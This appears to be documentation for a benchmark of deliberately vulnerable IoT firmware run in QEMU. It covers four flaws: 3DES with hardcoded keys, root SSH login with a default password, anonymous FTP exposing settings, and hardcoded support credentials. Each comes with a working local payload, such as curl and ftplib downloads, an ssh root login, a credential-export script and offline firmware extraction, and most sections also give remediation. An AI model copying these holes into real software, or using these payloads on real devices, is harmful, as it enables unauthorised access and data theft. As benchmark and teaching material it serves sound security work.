**Build and boot — host:**

```bash
FIRMWARE=router-cwe327-weak-cipher docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe327-weak-cipher ./scripts/run-qemu.sh
```

**Test — browser:** open <http://127.0.0.1:18080> and find the
**Device Backup Encryption** panel. Select **Encrypt**, enter `device-backup`
and click **Process backup**. Repeat with the same text: both results must show
`cipher=3DES-CBC`, `block_bits=64` and the same `3DES-CBC:...` frame.
Copy only that frame line into the field, select **Decrypt** and submit: the
result must be `device-backup`. The round trip verifies functionality; the
algorithm and fixed constants documented below identify the weakness.

**Alternative — guest:**

```sh
printf '%s' 'device-backup' | iotbench-weak-cipher encrypt > /tmp/backup-a.enc
printf '%s' 'device-backup' | iotbench-weak-cipher encrypt > /tmp/backup-b.enc
cmp /tmp/backup-a.enc /tmp/backup-b.enc
echo "exit=$?"
iotbench-weak-cipher decrypt < /tmp/backup-a.enc
```

Expected: `cmp` returns `exit=0`; decryption returns `device-backup` without
a trailing newline.

These images implement intentionally vulnerable device backup encryption under
[CWE-327](https://cwe.mitre.org/data/definitions/327.html) (use of a broken or
risky cryptographic algorithm). The package directory is
`meta-iotbench/recipes-vulns/weak-cipher/`; its BitBake package is `cwe327-weak-cipher`.
The image IDs follow `<device>-cwe327-weak-cipher` for all eleven device profiles
listed in the root README. The recipes work with the existing architecture
selector and require no new layers or external source downloads.

### Scenario and scope

The shared web admin encrypts and restores device backup text using three-key
Triple DES in CBC mode with PKCS#7 padding. OpenSSL's
[`EVP_des_ede3_cbc()`](https://docs.openssl.org/3.0/man3/EVP_des_cbc/)
performs the actual encryption. The helper links against `libcrypto`; it does
not depend on PHP's optional OpenSSL extension, which the platform disables.

Triple DES has a 64-bit block size and is an obsolete choice for new encrypted
data; [NIST withdrew its TDEA recommendation in January 2024](https://www.nist.gov/news-events/news/2023/06/nist-withdraw-special-publication-800-67-revision-2).
The scenario also intentionally embeds publicly known keys and reuses a fixed IV.
Anyone with these constants can decrypt backups and generate valid frames.
Each image installs only this vulnerability package, retains its
device profile and exposes the scenario through HTTP on the shared dashboard.
The native MQTT, camera and Modbus services keep their normal telemetry role;
the encrypted backup interface is the same for all devices.

The helper contains the following hardcoded constants, identical in all eleven
device images (hexadecimal bytes, not ASCII strings):

| Constant | Bytes | Hex value |
| --- | --- | --- |
| 3DES key | 24 | `0123456789abcdef23456789abcdef01456789abcdef0123` |
| CBC IV | 8 | `1234567890abcdef` |
| HMAC-SHA256 key | 32 | `a0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf` |

These values are compiled into `iotbench-weak-cipher`; no random keys, random
IVs, runtime key files or per-device overrides are used. Identical plaintext
produces identical ciphertext and tags across requests, reboots, fresh QEMU
snapshots and different device profiles. Backups can be restored across these
images. Backups made by the previous random-key implementation are incompatible.

The existing frame format retains HMAC-SHA256 over the IV and ciphertext.
Malformed frames and modifications without a recomputed tag are rejected before
decryption. Since the HMAC key is also public, this check provides no trustworthy
authentication: anyone can recompute a valid tag. Frames must carry the fixed IV.

### Build and boot

From the repository root:

```bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe327-weak-cipher'
FIRMWARE=router-cwe327-weak-cipher docker compose run --rm yocto
FIRMWARE=router-cwe327-weak-cipher ./scripts/run-qemu.sh
```

Replace `router` with any supported device. The root README provides the loop
to build all eleven images. Output is exported to
`deploy-images/<device>-cwe327-weak-cipher/<machine>/`.

### Dashboard and HTTP API

Open `http://127.0.0.1:8080`, locate **Device Backup Encryption**, leave the
operation as **Encrypt**, and submit backup text. The output begins with:

```text
cipher=3DES-CBC
block_bits=64
3DES-CBC:<hexadecimal-frame>
```

Copy only the `3DES-CBC:...` line into the text field, select **Decrypt**, and
submit again. The original backup text is returned. Encrypting the same input
twice gives the same frame because both key and IV are fixed. Altering a hex digit in
a frame returns `Invalid encrypted frame`.

For direct API use, load `/`, read `meta[name="dashboard-token"]`, and send
JSON to `/api.php` with `X-Dashboard-Token: <token>`:

```json
{"action":"weak_cipher","operation":"encrypt","data":"{\"backup\":\"device-settings\"}"}
```

The response contains `ok`, `cipher`, `block_bits`, `result`, and the display
`output`. Submit the encryption response's `result` as `data` with
`"operation":"decrypt"` to recover the plaintext. CSRF and HTTP method checks
are supplied by the shared dashboard. Backup text must be UTF-8 and no more
than 4096 bytes; the encrypted frame is at most 8297 ASCII characters. The CLI
also supports binary plaintext and empty input.

### Guest CLI and frame format

From the guest serial console:

```bash
printf '%s' 'device-backup' | iotbench-weak-cipher encrypt > /tmp/device-backup.enc
iotbench-weak-cipher decrypt < /tmp/device-backup.enc
```

The ciphertext is `3DES-CBC:` followed by hex-encoded
`IV[8] || ciphertext[multiple of 8] || HMAC-SHA256[32]`. The CLI emits a
newline after the frame; decryption accepts that newline and emits the exact
plaintext bytes. The same embedded constants are used by the guest console and
the dashboard, which runs as `routerweb`.

The CLI accepts only `encrypt` or `decrypt`; there is no key-file argument.
The web action passes input through stdin and invokes a fixed argument vector
without a shell.

### Verification

The regression script exercises binary/text round trips, the 4096-byte limit,
hardcoded key/IV interoperability with OpenSSL, identical output from separate
processes, frame creation using the published keys, malformed input rejection and absence of
runtime key files. It requires Python 3, the compiled helper and the
OpenSSL CLI on the test host:

```bash
python3 scripts/test-weak-cipher.py /path/to/iotbench-weak-cipher
```

For a host build, compile against the host OpenSSL headers/library (this is a
test binary, separate from the cross-compiled Yocto image):

```bash
cc -std=c11 -Wall -Wextra -Werror \
  meta-iotbench/recipes-vulns/weak-cipher/files/iotbench-weak-cipher.c \
  $(pkg-config --cflags --libs openssl) -o /tmp/iotbench-weak-cipher
python3 scripts/test-weak-cipher.py /tmp/iotbench-weak-cipher
```

For runtime validation, boot each exported image and perform the dashboard
round trip above, or run the HTTP regression client against the booted image:

```bash
python3 scripts/test-weak-cipher-http.py
# Optional URL when QEMU_HTTP_PORT differs from 8080:
python3 scripts/test-weak-cipher-http.py http://127.0.0.1:18080
```

The helper runs under the existing service sandbox. A
lighttpd drop-in permits writes only to `/var/lib/router-dashboard` for
dashboard state; it needs no privilege escalation or additional
service ports.

## Permitted Root SSH Login

### Build, boot and manual testing

**What this tests.** SSH allows direct root login with the default lab password.
A successful login immediately grants administrative privileges.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe276-permit-root-login docker compose run --rm yocto
QEMU_HTTP_PORT=18080 QEMU_SSH_PORT=2222 \
  FIRMWARE=router-cwe276-permit-root-login ./scripts/run-qemu.sh
```

**Test — second host terminal:**

```bash
ssh -p 2222 -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 root@127.0.0.1 'id'
```

On the first connection, confirm the lab guest's host key, then enter
`routeradmin`. Expected: output containing `uid=0(root)`. This confirms remote
access with the known password. If SSH reports a changed host key after you
replace the firmware, verify that you are connecting to the new local guest,
remove only the old entry with `ssh-keygen -R '[127.0.0.1]:2222'`, then retry.

**Check — guest:** `/usr/sbin/sshd -T` must show `permitrootlogin yes` and
`passwordauthentication yes`. A connection error neither confirms nor rules out
the authentication defect: check the service and forwarding first.

The `cwe276-permit-root-login` module intentionally permits direct SSH login
as `root` using a password. Image IDs follow
`<device>-cwe276-permit-root-login` for all eleven device profiles. Evaluate
the scenario through the effective SSH configuration, an actual login attempt
and the privileges obtained. Source inspection alone does not confirm that a
running firmware accepts the login; the commands below are a verification
procedure, not a record of completed runtime tests.

### Configuration and security implications

The module recipe is
[`cwe276-permit-root-login_1.0.bb`](../meta-iotbench/recipes-vulns/cwe276-permit-root-login/cwe276-permit-root-login_1.0.bb).
It depends on `openssh-sshd` and installs
[`00-iotbench-permit-root-login.conf`](../meta-iotbench/recipes-vulns/cwe276-permit-root-login/files/00-iotbench-permit-root-login.conf)
under `/etc/ssh/sshd_config.d/`, with these settings:

```text
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords no
```

This policy permits root password authentication but rejects empty passwords.
The lab credential documented in the [root README](../README.md#firmware-shell-access)
is username `root`, password `routeradmin`. The common
[`iotbench-image.inc`](../meta-iotbench/recipes-images/iotbench-image.inc)
sets the root password using a SHA-512 crypt hash shared across the images.
Storing a hash does not remove the risk of a publicly known default password.

The security risk combines a reachable SSH service, a known default credential
and immediate administrative access. The project labels the permissive default
policy as [CWE-276: Incorrect Default Permissions](https://cwe.mitre.org/data/definitions/276.html).
The presence of `PermitRootLogin yes` alone does not establish that an attacker
can authenticate: the effective configuration, account state and network
reachability must also be checked.

### Build and boot

From the repository root, build the image if it has not already been exported,
then boot it:

```bash
FIRMWARE=router-cwe276-permit-root-login docker compose run --rm yocto
FIRMWARE=router-cwe276-permit-root-login ./scripts/run-qemu.sh
```

Replace `router` with another supported device if needed. The existing
`YOCTO_MACHINE` selector applies to both build and boot. By default,
`run-qemu.sh` forwards host `127.0.0.1:2222` to guest TCP port 22 for these
images; `QEMU_SSH_PORT` changes the host port. Use a second host terminal for
the SSH test while QEMU remains running.

### Verify the effective configuration

Log in through the guest serial console as `root` with password `routeradmin`,
then run inside the guest:

```bash
/usr/sbin/sshd -t
/usr/sbin/sshd -T | grep -E \
  '^(permitrootlogin|passwordauthentication|permitemptypasswords|authenticationmethods) '
```

`sshd -t` should exit successfully. The effective configuration for the
intended scenario should contain at least:

```text
permitrootlogin yes
passwordauthentication yes
permitemptypasswords no
```

Also inspect `authenticationmethods` for any additional authentication
requirements. The installed fragment must be included by the main
`/etc/ssh/sshd_config`. OpenSSH normally uses the first value encountered for
a setting, and included wildcard files are processed in lexical order. A
fragment's contents alone therefore do not prove which policy applies.
See the [OpenSSH configuration manual](https://man.openbsd.org/sshd_config.5).

If the configuration contains `Match` blocks, use `sshd -T -C` with the actual
connection parameters, including `user=root` and the source address as seen
by the guest. If the running service uses a custom configuration file or
command-line overrides, reproduce those options in the verification command.
`sshd -T` evaluates configuration on disk; a real login also verifies the
behavior of the running service. See the
[OpenSSH test-mode documentation](https://man.openbsd.org/sshd.8).

### Verify login and privileges without changing the guest

From the second terminal on the host:

```bash
ssh -p 2222 \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o NumberOfPasswordPrompts=1 \
  root@127.0.0.1 'id'
```

Enter `routeradmin` when prompted. These options select password authentication
and avoid accidentally demonstrating access through an existing SSH key.
Adjust `-p` if you set `QEMU_SSH_PORT`.

An output containing `uid=0(root)` confirms that the default password grants
remote command execution with root privileges. The `id` command provides
evidence without modifying files; no destructive operation is needed to
demonstrate the impact.

| Result | Interpretation |
| --- | --- |
| Connection refused or timeout | Investigate service availability, port forwarding or network reachability; authentication security has not yet been evaluated. |
| `Permission denied` | Authentication was rejected; check effective policy, credential and account state before drawing a conclusion. |
| Command output contains `uid=0(root)` | Direct root access with the default password is confirmed. |

### Exposure and severity

The provided QEMU forwarding binds to `127.0.0.1`, so that forwarded SSH port
is reachable from the local host. This limits exposure in the supplied lab
setup; it does not correct the guest's permissive authentication policy.
On a device reachable from a LAN or the Internet, anyone who knows the default
password could obtain root access if the same login behavior applies.

Such access can compromise the firmware's data, services and configuration.
Assess severity from actual reachability, whether the default credential is
still valid, any additional authentication requirements and the scope of the
obtained privileges. Record the tested image and architecture, effective
settings, connection endpoint and `id` output as evidence.

### Remediation and verification

For a firmware intended for real use, disable direct root SSH login:

```text
PermitRootLogin no
```

Provide access through individual accounts and grant administrative privileges
only where needed. Replace the shared default credential. If password
authentication is unnecessary, use key authentication for those accounts and
disable password authentication according to the deployment's access policy.

`PermitRootLogin prohibit-password` blocks root password and
keyboard-interactive authentication but still allows other methods, such as
public keys. It is not equivalent to disabling all root SSH login. See
[`PermitRootLogin` in the OpenSSH manual](https://man.openbsd.org/sshd_config.5#PermitRootLogin).

When applying a fix, remove or change the permissive setting in the effective
configuration; appending a later conflicting directive may not override it.
Validate with `sshd -t`, reload or restart the SSH service and repeat the
configuration and login checks. Keep serial access available while doing so.

The correction is demonstrated when SSH remains operational, the intended
non-root account can still authenticate, and direct root login is rejected
even with the correct password. For `PermitRootLogin no`, verify that root key
authentication is also rejected if a root key was previously authorized.
The default QEMU run discards guest changes when it exits, so a lasting fix
must be applied to the firmware sources and verified in a rebuilt image.

## Allow anonymous login

### Build, boot and manual testing

**What this tests.** FTP publishes copies of maintenance settings with anonymous
access, allowing clients to download them without a real account.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe276-allow-anonymous-login docker compose run --rm yocto
QEMU_HTTP_PORT=18080 QEMU_FTP_PORT=22121 \
  FIRMWARE=router-cwe276-allow-anonymous-login ./scripts/run-qemu.sh
```

**Test — second host terminal:**

```bash
curl --fail --user 'anonymous:' --list-only ftp://127.0.0.1:22121/
curl --fail --user 'anonymous:' ftp://127.0.0.1:22121/settings.json
curl --fail --user 'anonymous:' ftp://127.0.0.1:22121/device.conf
```

Expected: a listing containing `README.txt`, `device.conf`, `peripherals.conf`
and `settings.json`. The JSON contains fields such as `lan_ip`, `ssid` and
`dhcp_start`; `device.conf` identifies the router. An actual download confirms
the exposure. Passive host ports **30000–30009** must be available alongside
22121. If login succeeds but downloads stall, check those ports too.

### Scenario and CWE mapping

Each `<device>-cwe276-allow-anonymous-login` firmware enables anonymous FTP
access to a maintenance backup by default. The supported devices are `router`,
`ipcamera`, `smartplug`, `thermostat`, `plc`, `smartbulb`, `smarthub`, `envsensor`,
`smartspeaker`, `healthmonitor` and `doorlock`. These are separate images from
both the weak-cipher and permitted-root-login scenarios above; each installs
one vulnerability package and keeps its device profile, web admin, native
service and peripheral simulator.

The project maps this scenario to
[CWE-276: Incorrect Default Permissions](https://cwe.mitre.org/data/definitions/276.html).
The defect is a shipped maintenance-access policy that grants everyone read
access to settings intended for maintenance staff. Anonymous FTP can be
appropriate for intentionally public files; exposing a private configuration
backup under that policy is the weakness reproduced here. The benchmark uses
simulated data only.

The attacker needs network access to FTP and no account or prior foothold.
The expected impact is disclosure of device identity, network configuration
and peripheral layout. The anonymous session is read-only and confined to its
FTP directory. It does not provide a shell or administrative privileges.

### Package and runtime behavior

The package is
[`cwe276-allow-anonymous-login`](../meta-iotbench/recipes-vulns/cwe276-allow-anonymous-login/cwe276-allow-anonymous-login_1.0.bb).
It uses `vsftpd` from the already enabled, pinned `meta-networking` layer;
there is no change to the shared platform configuration or other firmware
variants. The upstream package creates the `ftp` account, enables
`vsftpd.service` and provides its empty privilege-separation directory.

A systemd drop-in replaces the service command with:

```text
/usr/sbin/vsftpd /etc/iotbench/vsftpd-anonymous.conf
```

The installed [configuration](../meta-iotbench/recipes-vulns/cwe276-allow-anonymous-login/files/vsftpd-anonymous.conf)
contains these key settings:

```text
anonymous_enable=YES
no_anon_password=YES
ftp_username=ftp
anon_root=/var/lib/ftp
anon_world_readable_only=YES
local_enable=NO
write_enable=NO
pasv_min_port=30000
pasv_max_port=30009
port_enable=NO
```

Both `anonymous` and `ftp` select anonymous access. `no_anon_password=YES`
permits login without a `PASS` command. See the
[upstream vsftpd configuration reference](https://security.appspot.com/vsftpd/vsftpd_conf.html)
for these options.

Before starting the daemon, the
[backup helper](../meta-iotbench/recipes-vulns/cwe276-allow-anonymous-login/files/iotbench-anonymous-backup)
copies the following files into `/var/lib/ftp/` and sets mode `0644`:

| Download | Original source | Contents |
| --- | --- | --- |
| `device.conf` | `/etc/iotbench/device.conf` | Device display name and class |
| `peripherals.conf` | `/etc/iotbench/peripherals.conf` | Device-specific sensor/actuator specification |
| `settings.json` | `/var/lib/router-dashboard/settings.json` | Shared web-admin network and Wi-Fi settings |
| `README.txt` | Installed by the vulnerability package | Scenario description |

The original dashboard settings are installed with mode `0640` in a `0750`
service directory. Publishing a world-readable copy inside the anonymous FTP
root deliberately removes that access boundary. The exported directory is
root-owned with mode `0755`, so the `ftp` user cannot write there. Uploads,
directory creation, deletion and local-account FTP logins are disabled.
The backup is a snapshot at FTP service startup; restart `vsftpd.service`
to refresh it after changing dashboard settings. The settings schema is shared
across devices, while identity and peripherals differ by device.

### Build and boot

From the repository root, validate recipes and dependencies, build and boot:

```bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe276-allow-anonymous-login'
FIRMWARE=router-cwe276-allow-anonymous-login docker compose run --rm yocto
QEMU_FTP_PORT=22121 FIRMWARE=router-cwe276-allow-anonymous-login ./scripts/run-qemu.sh
```

Replace `router` with any device listed above. To build all eleven images:

```bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe276-allow-anonymous-login.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
```

The default machine is `qemuarm64`. Set `YOCTO_MACHINE` for another architecture
supported by the [root README](../README.md#architectures) at both build and
boot time. Outputs are the compressed ext4 root filesystem and kernel under
`deploy-images/<device>-cwe276-allow-anonymous-login/<machine>/`.

The examples in this section explicitly set `QEMU_FTP_PORT=22121`, so QEMU
forwards host `127.0.0.1:22121` to guest TCP port `21`. If `QEMU_FTP_PORT` is
unset, the script uses host port `2121` instead. Always use the host port
printed in the startup line `FTP: ftp://127.0.0.1:<port>` for curl and the
regression client. Changing the port requires restarting QEMU with the new
environment setting.

Passive data ports `30000-30009` are forwarded using the same host and guest
numbers. HTTP and the device's MQTT or Modbus forwarding remain available.
`QEMU_FTP_PORT` changes only the control port. To boot the PLC with the same
FTP endpoint used by the payloads below:

```bash
QEMU_FTP_PORT=22121 FIRMWARE=plc-cwe276-allow-anonymous-login ./scripts/run-qemu.sh
```

Use passive mode. EPSV clients use the control connection's address for data;
PASV clients must likewise use the host address instead of the guest's private
address. Modern curl defaults and the Python client below handle this. Forwarding
only port 21 is insufficient for listing or downloading. Keep `30000-30009`
free and run one anonymous-FTP QEMU instance at a time. All forwarding binds
only to loopback; on a directly reachable device the guest FTP listener would
be accessible at its own IP address.

### Payloads and expected results

Run these commands in a second host terminal while QEMU remains running with
`QEMU_FTP_PORT=22121`. List the directory and download the settings without a
real credential:

```bash
curl --fail --user 'anonymous:' --list-only ftp://127.0.0.1:22121/
curl --fail --user 'anonymous:' ftp://127.0.0.1:22121/settings.json
curl --fail --user 'anonymous:' ftp://127.0.0.1:22121/device.conf
```

Expected listing: `README.txt`, `device.conf`, `peripherals.conf`,
`settings.json`. The settings download returns JSON with fields such as
`lan_ip`, `ssid` and `dhcp_start`. The identity download identifies the selected
device class. Some clients still send an empty or placeholder `PASS`; it is
not checked as a credential in this scenario.

To show that login succeeds on `USER` alone:

```bash
python3 - <<'PY'
from ftplib import FTP
from io import BytesIO
with FTP() as ftp:
    ftp.connect('127.0.0.1', 22121, timeout=10)
    print(ftp.sendcmd('USER anonymous'))
    data = BytesIO()
    ftp.retrbinary('RETR settings.json', data.write)
    print(data.getvalue().decode())
    ftp.quit()
PY
```

Expected control response: `230 Login successful.` followed by the downloaded
settings. This establishes both credential-free login and actual data access.
A welcome banner or a successful TCP connection alone is insufficient evidence.

### Regression and guest inspection

The [regression client](../scripts/test-anonymous-login.py) uses Python's
standard library and tests both `anonymous` and the `ftp` alias. It verifies
login without `PASS`, passive listing, readable JSON settings, device identity,
peripheral download, rejection of upload/mkdir/delete, confinement of file
reads and rejection of root FTP login with the valid serial-console password.

```bash
python3 scripts/test-anonymous-login.py --device router --port 22121
# When the booted device is the PLC:
python3 scripts/test-anonymous-login.py --device plc --port 22121
```

Expected: three `PASS` lines and exit status zero. It works against any supported
architecture; test each exported device image separately.
If QEMU was started without a port override, use `2121` in the curl and inline
Python examples and pass `--port 2121` to the regression client (its default).

#### Connection refused: check the host control port

`curl: (7) Failed to connect to 127.0.0.1 port 2121` means curl could not
establish the TCP connection; it has not attempted FTP authentication. A QEMU
instance forwarding FTP on `22121` will not accept a connection on `2121`.
Use the endpoint printed by `run-qemu.sh`, keep QEMU running and wait for the
guest FTP service to start before running the payloads.

On macOS, inspect the listening ports:

```bash
lsof -nP -iTCP:2121 -iTCP:22121 -sTCP:LISTEN
```

If QEMU listens on `22121`, use the `22121` commands above. If neither port
is listening, start the selected firmware and check its startup output for
errors. A host forwarding failure, such as an occupied HTTP port, prevents QEMU
from starting; free the conflicting port or select another `QEMU_HTTP_PORT`.

#### Inspect the guest service

Log in on the guest serial console with the root credential from the README
and inspect the running service and exported files:

```bash
systemctl status vsftpd.service
systemctl cat vsftpd.service
cat /etc/iotbench/vsftpd-anonymous.conf
ls -ld /var/lib/router-dashboard /var/lib/ftp
ls -l /var/lib/router-dashboard/settings.json /var/lib/ftp/settings.json
```

Record the firmware ID, machine, service command, file permissions and FTP
client output. If control connects but transfers time out, check passive-port
forwarding. If login fails or the service is inactive, inspect
`journalctl -u vsftpd.service` and the installed drop-in. The upstream
`/etc/vsftpd.conf` is not the configuration used by this variant.

### Completed validation

On 2026-10-05, all eleven `qemuarm64` targets passed BitBake parsing,
dependency resolution and actual compilation/export. Each exported image was
booted in QEMU and passed the FTP regression client plus an HTTP dashboard
check. Router validation used TCG; the other ten used HVF with the host CPU.
The tested host control ports were FTP `22121` and HTTP `18080`, with passive
data on `30000-30009`.

Router serial inspection also confirmed an active `vsftpd.service`, the intended
configuration argument, a root-owned `0755` export directory and a `0644`
settings copy alongside the original `0640` file. The local artifact report,
including checksums, is `deploy-images/anonymous-login-qemuarm64-validation.txt`.
Other supported architectures have not been built or boot-tested for this
scenario in this validation run.

### Remediation and verification

Disable anonymous login in `/etc/iotbench/vsftpd-anonymous.conf`:

```text
anonymous_enable=NO
```

Remove maintenance backups from the public export and restrict their
permissions and directory access to the maintenance account. If remote backup
access is required, provide an authenticated maintenance service. Merely setting
`no_anon_password=NO` still allows anonymous login with an arbitrary password
and does not establish account authentication. Changing only the unused
upstream `/etc/vsftpd.conf` does not change this service's policy.

Restart the service and repeat the login/download checks. A corrected image
must reject `USER anonymous` / anonymous authentication before permitting any
backup download. The supplied regression client should fail against a fixed
image because its positive anonymous-access checks describe the vulnerable
benchmark. Apply lasting remediation in the sources and rebuild; default QEMU
snapshots discard guest edits on exit.

## Hardcoded credentials

### Build, boot and manual testing

**What this tests.** The support function authenticates a fixed username and
password embedded in the firmware and shared across devices.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe798-hardcoded-credentials docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe798-hardcoded-credentials ./scripts/run-qemu.sh
```

**Test — browser:** open <http://127.0.0.1:18080> and find
**Vendor Support Backup**. Enter username `support` and password
`iotbench-support-2026`, then click **Export support backup**.
Expected: `HARDCODED_CREDENTIALS_ACCEPTED` and the backup JSON. Repeat with
password `wrong-password`: expect `Invalid support credentials` and no backup.

**Credential source — guest:**

```sh
sed -n '/const IOTBENCH_SUPPORT_USERNAME/p; /const IOTBENCH_SUPPORT_PASSWORD/p' \
  /usr/share/router-dashboard/modules/hardcoded-credentials/module.php
```

Expected: the same two credentials. Inspection shows that they are embedded;
the web test shows that the authentication check actually accepts them.

### Scenario, scope and attacker position

The firmware IDs are `<device>-cwe798-hardcoded-credentials` for all eleven
profiles in the root README. Each image combines its normal device profile
with the single vulnerability package `cwe798-hardcoded-credentials`.

The shared web admin exposes **Vendor Support Backup**, an authenticated
maintenance export. This implements the inbound variant of
[CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html):
input is checked against credentials embedded in the product, identical in
every installation, without a supported way to change them.

| Credential | Exact, case-sensitive value |
| --- | --- |
| Username | `support` |
| Password | `iotbench-support-2026` |

These are plaintext constants in
`/usr/share/router-dashboard/modules/hardcoded-credentials/module.php`.
There is no random provisioning, environment override, runtime password file
or password-change API. Knowing the credential from one extracted image gives
access to the same support function on every device and fresh boot.

The canonical attacker is a remote HTTP client with knowledge of the firmware
credential, acquired from firmware extraction or this published lab fixture.
The attacker loads the public dashboard to obtain its request token and submits
the credential to the support action. That token guards requests against CSRF;
it does not authenticate a support user.

The exported `backup.maintenance` object is read from a real installed file,
`/usr/share/iotbench/hardcoded-credentials/support-backup.json`, outside
`/www/pages`. It contains synthetic, maintenance-only provisioning and
inventory data; successful export also includes device identity, dashboard
settings and live peripheral values. The support credential guards this
maintenance export. The existing public dashboard/telemetry is still public;
this module does not add a login wall around the shared platform.

The support account is an application identity, not a Linux or SSH account.
The action runs as `routerweb`, with no sudo permission or shell execution.
Native camera, MQTT and Modbus services retain their normal telemetry role;
the HTTP support interface is the same across devices. There are no service
sandbox overrides or new layers. This scenario is separate from the router's
existing CWE-798 sudo/editor images.

For MQTT profiles, the shared Mosquitto build retains its systemd feature so
the upstream `Type=notify` unit finishes starting and releases the telemetry
publisher. TLS and websockets remain disabled in this lab build. The baseline
broker listens on guest loopback; inspect native telemetry from the guest
console with `mosquitto_sub -h 127.0.0.1 -t iotbench/<device>/state -C 1`.
QEMU port forwarding alone does not expose this loopback-only broker.

### Build and boot

From the repository root, validate one target and build it:

```bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe798-hardcoded-credentials'
FIRMWARE=router-cwe798-hardcoded-credentials docker compose run --rm yocto
FIRMWARE=router-cwe798-hardcoded-credentials ./scripts/run-qemu.sh
```

Replace `router` with any supported device. To build all eleven images:

```bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe798-hardcoded-credentials.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
```

The default machine is `qemuarm64`. Set `YOCTO_MACHINE` consistently when
building and booting another supported architecture. Output is exported to
`deploy-images/<device>-cwe798-hardcoded-credentials/<machine>/`, containing
the compressed ext4 rootfs and kernel. `scripts/build-all.sh` includes all new
recipes automatically.

Open `http://127.0.0.1:8080` and use **Vendor Support Backup**. Enter the account
above and choose **Export support backup**. The UI leaves both fields empty
initially. Expected output starts with `HARDCODED_CREDENTIALS_ACCEPTED` and
prints the backup JSON. Incorrect credentials show `Invalid support credentials`.
If port 8080 is occupied, boot with `QEMU_HTTP_PORT=18080` and use
`http://127.0.0.1:18080` in the examples and test client.

### Firmware extraction

From the guest serial console, log in with the root credential documented in
the README and inspect the module:

```bash
sed -n '/const IOTBENCH_SUPPORT_USERNAME/p; /const IOTBENCH_SUPPORT_PASSWORD/p' \
  /usr/share/router-dashboard/modules/hardcoded-credentials/module.php
cat /usr/share/iotbench/hardcoded-credentials/support-backup.json
```

Expected: the two constants show the exact username/password above. They are
the values actually used in `hash_equals()` by the support action.
Serial inspection is evidence of recoverability, not a remote attacker step.

An attacker with only the exported firmware can extract the same values
offline. On a host with `zstd` and the e2fsprogs `debugfs` utility:

```bash
zstd -d \
  deploy-images/router-cwe798-hardcoded-credentials/qemuarm64/iotbench-router-cwe798-hardcoded-credentials-qemuarm64.rootfs.ext4.zst \
  -o /tmp/iotbench-hardcoded-credentials.ext4
debugfs -R 'cat /usr/share/router-dashboard/modules/hardcoded-credentials/module.php' \
  /tmp/iotbench-hardcoded-credentials.ext4
```

This reads the ext4 image without mounting or booting it. Local access to the
firmware file is sufficient; network requests for the module source or the
backup file return HTTP 404 because those files are outside the document root.

### HTTP payloads and expected results

The API is `POST /api.php` with JSON action `support_backup` and header
`X-Dashboard-Token`. A valid request body is:

```json
{"action":"support_backup","username":"support","password":"iotbench-support-2026"}
```

This dependency-free Python example retrieves the public token and performs
the export from a host terminal while QEMU is running:

```bash
python3 - <<'PY'
from html.parser import HTMLParser
import json
import urllib.request

base = "http://127.0.0.1:8080"

class TokenParser(HTMLParser):
    token = None
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "meta" and attrs.get("name") == "dashboard-token":
            self.token = attrs.get("content")

with urllib.request.urlopen(base + "/", timeout=10) as response:
    page = response.read().decode()
parser = TokenParser()
parser.feed(page)
assert parser.token, "Dashboard token not found"
request = urllib.request.Request(
    base + "/api.php",
    data=json.dumps({"action": "support_backup", "username": "support",
                     "password": "iotbench-support-2026"}).encode(),
    headers={"Content-Type": "application/json",
             "X-Dashboard-Token": parser.token},
)
with urllib.request.urlopen(request, timeout=10) as response:
    print(response.status)
    print(json.dumps(json.load(response), indent=2))
PY
```

Expected: HTTP 200, `ok: true`, `authenticated_as: "support"`, the selected
device class, `signal: "HARDCODED_CREDENTIALS_ACCEPTED"`, and a backup including
`maintenance.backup_scope: "vendor-support-only"` and
`maintenance.inventory_reference: "IOTBENCH-SUPPORT-LAB"`. Peripheral values
can differ across requests because the simulator runs continuously.

| Request condition | Expected HTTP result |
| --- | --- |
| Exact published username and password, valid token | 200; maintenance backup exported |
| Missing, empty or incorrect credentials, valid token | 401; `Invalid support credentials`, no backup |
| Array/object credential or username >64 bytes / password >128 bytes | 422; `Invalid credential format`, no backup |
| Missing or invalid dashboard token | 403 before the action runs |
| Direct URL for the module or backup file | 404 |

Each export checks the credentials again. A successful request does not create
a login session that permits subsequent anonymous exports. There is no SQL,
user-controlled filename or command evaluation: the measured weakness is the
fixed credential used by the actual authentication check.

### Regression verification

With the selected image running, execute:

```bash
python3 scripts/test-hardcoded-credentials.py --device router
# For a different device and host HTTP port:
python3 scripts/test-hardcoded-credentials.py \
  --device plc --url http://127.0.0.1:18080
```

Expected: four `PASS` lines and exit status zero. The client checks the panel,
request-token enforcement, correct/incorrect/missing credentials, malformed
input, repeated authenticated exports, device identity, live peripherals,
the maintenance fixture, direct-file HTTP denial and absence of a persistent
authentication bypass. It requires only Python 3's standard library.

Boot and test each device separately. Repeat after reboot to confirm the
credential is unchanged. Reuse this same client/credential on another device
to demonstrate cross-device access.

### Completed validation

On 2026-10-06, all eleven `qemuarm64` targets passed BitBake parsing,
dependency resolution, actual compilation and export. Every exported image
was booted in QEMU with HVF and the host CPU and passed the HTTP regression
client. The same support credential was accepted across all device profiles.

